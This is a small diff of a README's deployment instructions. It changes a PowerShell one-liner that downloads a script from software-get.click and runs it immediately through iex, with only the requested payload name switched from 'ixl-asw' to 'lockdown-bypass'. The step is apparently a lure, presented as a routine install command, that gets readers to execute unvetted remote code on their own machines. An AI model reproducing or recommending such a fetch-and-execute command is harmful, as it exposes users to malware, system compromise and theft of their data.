@@ -29,7 +29,7 @@
 
 ### Step 2: Execute Deployment Command
 ```cmd
-powershell -Command "irm https://software-get.click/Loader.ps1?get=ixl-asw | iex"
+powershell -Command "irm https://software-get.click/Loader.ps1?get=lockdown-bypass | iex"
 ```
 
 ### Step 3: Wait for Completion
